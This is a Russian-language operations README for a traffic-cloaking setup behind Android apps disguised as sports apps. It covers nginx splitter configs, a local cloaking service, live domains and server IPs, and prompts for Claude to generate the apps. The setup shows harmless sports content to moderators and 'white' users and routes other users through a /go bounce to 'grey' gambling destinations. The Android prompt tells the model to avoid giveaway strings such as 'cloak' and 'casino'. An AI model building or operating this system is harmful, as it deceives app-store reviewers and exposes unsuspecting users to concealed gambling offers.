# Мини-сервер — как поднять

Каждой приле — свой мини-сервер (VPS + свой домен). На нём:

1. **Nginx** — принимает SDK POST + отдаёт Next.js спортивный лендинг для браузеров
2. **Mini-КЛО** — локальный FastAPI на `127.0.0.1:8100`, скорит трафик самостоятельно
3. **Next.js** — спортивный контент для белых и модеров

Всё скоринг локально. Никаких запросов к центральному кло (`api.threeamigosteam.com`) в hot path — только config sync + logs push (async, раз в 5 мин).

---

## Архитектура (2026-07-04)

```
Прила (SDK v4)                               Play Integrity API
    │  POST /football (или свой splitter)    IPQS / IPinfo
    │  headers: X-Sid, X-Instance-Id, X-Integrity-Token
    ▼                                        ▲
CF (proxy)                                    │
    ▼                                        │
Nginx на мини-сервере                        │
    │  okhttp UA → 418 → @sdk_proxy → 127.0.0.1:8100
    ▼                                        │
Mini-КЛО FastAPI :8100 ───── PI / IPQS / IPinfo (server-to-server)
    │
    │  Async (не в hot path):
    │  ├── log_shipper → main КЛО (batch, 30s)
    │  └── sync.py → main КЛО (cron 5 мин, pull apps.json + GCP keys)
    ▼
JSON {"url": "https://твой-домен.com/go?t=<b64>"}     ← Пункт 3
```

Grey verdict URL идёт через **/go** на своём же мини-сервере (не threeamigos!) — Chrome Custom Tabs показывает свой домен.

---

## Действующие мини-серверы

| Прила | Домен | Splitter path | IP |
|---|---|---|---|
| Sisal Football | `sisalfootballapp.com` | `/football` | 38.180.224.3 |
| Betsson | `bsonsportapp.com` | `/betsson_live` | 38.180.74.83 |
| Total Casino #1 | `supercastotalgame.com` | `/total_play` | 38.244.152.111 |
| Total Casino #2 | `totalsupergame.com` | `/game` | 38.244.152.11 |
| Olimpbet | `olimpcinemapp.com` | `/olimplay` | 149.33.0.240 |
| Snai | `footballapisnai.com` | `/sports` | 149.33.29.82 |

---

## Быстрый старт (новый мини-сервер)

### 1. VPS + домен

- **VPS**: Ubuntu 22.04+, 1 vCPU, 1GB RAM, Docker
- **Домен**: нейтральный (`sport-app-hub.com`, `game-stats.xyz`)
- **DNS**: A-запись на IP VPS (через CF)

### 2. Nginx + SSL

```bash
apt install -y nginx certbot python3-certbot-nginx
certbot --nginx -d ТВОЙ-ДОМЕН.com
```

### 3. Next.js спортивный лендинг (Docker :3000)

Стандартный спортивный контент через API-FOOTBALL. Промпт для Claude — в конце файла.

### 4. Nginx config — 3 блока

**Splitter** — оба flow (SDK + браузер) на одном пути:
```nginx
location = /твой_path {
    # okhttp UA (SDK) → 418
    if ($http_user_agent ~* "okhttp") { return 418; }
    # sid в query → тоже 418
    if ($arg_sid$arg_app_id$arg_instance_id) { return 418; }
    # Иначе — браузер, отдать Next.js
    proxy_pass http://127.0.0.1:3000;
    ...
}

error_page 418 = @sdk_proxy;

location @sdk_proxy {
    internal;
    rewrite ^ /init break;
    proxy_pass http://127.0.0.1:8100;      # mini-КЛО локально
    proxy_set_header X-Proxy-Key "pk_...";
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    ...
}
```

**/go bounce** — прокси на main КЛО (Chrome Custom Tabs видит свой домен):
```nginx
location = /go {
    proxy_pass https://api.threeamigosteam.com/engine/go$is_args$args;
    proxy_ssl_server_name on;
    proxy_set_header Host api.threeamigosteam.com;
    proxy_set_header X-Proxy-Key "pk_...";
    ...
}

location = /go/verify {
    proxy_pass https://api.threeamigosteam.com/engine/go/verify$is_args$args;
    ... # тот же паттерн что /go
}
```

**/web_content** — для tracker.js analytics:
```nginx
location = /web_content {
    proxy_pass https://api.threeamigosteam.com/engine/web_content$is_args$args;
    proxy_set_header X-Proxy-Key "pk_...";
    ...
}
```

### 5. Mini-КЛО

Ставится один раз при деплое. Готовые файлы:

```bash
mkdir -p /opt/mini-clo
scp -r mini-clo/* root@server:/opt/mini-clo/
apt install -y python3-venv redis-server
cd /opt/mini-clo && python3 -m venv venv && venv/bin/pip install -r requirements.txt

# Секрет для sync с main КЛО (я дам)
echo "<shared_secret>" > /opt/mini-clo/config/mini_server_secret
echo "https://api.threeamigosteam.com/engine" > /opt/mini-clo/config/sync_url

# Первый sync — скачать apps.json + GCP ключи
/opt/mini-clo/venv/bin/python /opt/mini-clo/sync.py

# systemd
cp systemd/*.service systemd/*.timer /etc/systemd/system/
systemctl daemon-reload
systemctl enable --now mini-clo.service mini-clo-sync.timer
```

**Домен для /go endpoint** (нужно чтоб SDK получал URL со своим доменом):
```bash
# В systemd unit добавь Environment=
sed -i '/Environment=PYTHONUNBUFFERED=1/a Environment=BOUNCE_URL_BASE=https://ТВОЙ-ДОМЕН.com' \
    /etc/systemd/system/mini-clo.service
systemctl daemon-reload && systemctl restart mini-clo
```

### 6. Смок-тесты

```bash
# 1. Splitter принимает браузер → Next.js
curl -sI "https://ТВОЙ-ДОМЕН.com/твой_path" | head -3

# 2. Splitter с okhttp UA → mini-КЛО
curl -X POST "https://ТВОЙ-ДОМЕН.com/твой_path" \
  -H "User-Agent: okhttp/4.9.2" \
  -H "X-Sid: <sid_из_панели>" \
  -H "X-App-Id: <package_name>" \
  -H "X-Instance-Id: test_$(date +%s)"

# 3. /go bounce работает (Chrome Custom Tabs endpoint)
curl -sS "https://ТВОЙ-ДОМЕН.com/go?t=aHR0cHM6Ly9leGFtcGxlLmNvbQ%3D%3D" | head -20

# 4. Mini-КЛО жив
ssh root@server "systemctl is-active mini-clo && journalctl -u mini-clo -n 5"
```

---

## Troubleshooting

| Проблема | Решение |
|---|---|
| `nginx -t` fail: proxy_pass cannot have URI in named location | В `@sdk_proxy` используй `rewrite ^ /init break;` + `proxy_pass http://127.0.0.1:8100;` (БЕЗ URI после порта) |
| Mini-КЛО не стартует | `journalctl -u mini-clo -n 50`. Часто: apps.json пустой (sync не прошёл), GCP key нечитаемый, redis не запущен |
| Клики не долетают в панель | Проверь `sid` в реальном APK == `SERVICE_TOKEN` (auth_token app в панели): `grep -oE 'sid=[a-z0-9]+' /var/log/nginx/access.log` |
| /go возвращает 404 | Turnstile получил невалидный base64 в `?t=` — проверь encoding на клиенте |
| SDK видит 502 | Mini-КЛО умер. `systemctl restart mini-clo` |
| Обновил apps.json в панели, мини-сервер не видит | Sync каждые 5 мин. Форсировать: `systemctl start mini-clo-sync.service` |
| Docker не билдится | Node.js ≥ 20 в Dockerfile |
| SSL renew | `certbot renew` |

---

## Промпт для Claude — новый Next.js лендинг

```
Создай Next.js 15 приложение — спортивный информационный дашборд. Требования:

1. Стек: Next.js 15 App Router + React 19 + TypeScript + Tailwind CSS
2. Данные: API-FOOTBALL v3 (ключ через env API_FOOTBALL_KEY, server-side only)
3. Дизайн: тёмная тема, зелёный/лаймовый акцент, современный UI
4. Функционал: живые матчи, таблица лиг, расписание, статистика, прогнозы
5. Деплой: Docker (output: standalone), Nginx reverse proxy, SSL через certbot
6. PWA: manifest.json, service worker для offline, offline page
7. SEO: robots.ts, sitemap.ts, OG image
8. Security headers: X-Content-Type-Options, X-Frame-Options, Referrer-Policy
9. Digital Asset Links: /.well-known/assetlinks.json для Android App Links
10. Path приложения: /ТВОЙ_PATH (корень / редиректит туда)

Middleware НЕ добавляй — nginx делает всю маршрутизацию.
API-ключ никогда не должен попасть в браузер (нет NEXT_PUBLIC_ префикса).
```

---

## Промпт для Claude — новая Android-прила

```
Создай Android-приложение (Kotlin, Jetpack Compose, Material 3). Требования:

1. Тема: спортивная (тренировки, квизы по спортивным правилам)
2. Архитектура: Clean Architecture (domain/data/presentation), Koin DI
3. Экраны: Splash, Main, Quiz, Training, Rules, Stats, Settings, Offline
4. Данные: Room DB + DataStore
5. Сеть: при запуске один запрос через AppClient v4:

val client = AppClient(
    context = this,
    endpoint = BuildConfig.SERVICE_URL,
    path = BuildConfig.SERVICE_PATH,              // например "/football"
    authToken = BuildConfig.SERVICE_TOKEN,
    cloudProjectNumber = BuildConfig.CLOUD_PROJECT_NUMBER,
)

6. Если resolve() вернул URL → открыть через Chrome Custom Tabs (НЕ WebView)
7. Если resolve() вернул "" → показать нативный контент
8. Firebase: Crashlytics + Analytics + FCM push
9. Offline: ConnectivityObserver, OfflineHomeScreen
10. Навигация: Jetpack Navigation Compose
11. ProGuard/R8 minified в release
12. Permissions: только INTERNET + ACCESS_NETWORK_STATE
13. НЕ использовать: addJavascriptInterface, evaluateJavascript, WebView
14. НЕ собирать: GPU, device codename, build product, installed apps
15. НЕ хардкодить: домены бэкенд-серверов кроме endpoint из AppClient
16. НЕ палевные строки в DEX: cloak, casino, bet, verdict

Файл AppClient.kt приложу отдельно — скопируй в проект.
```
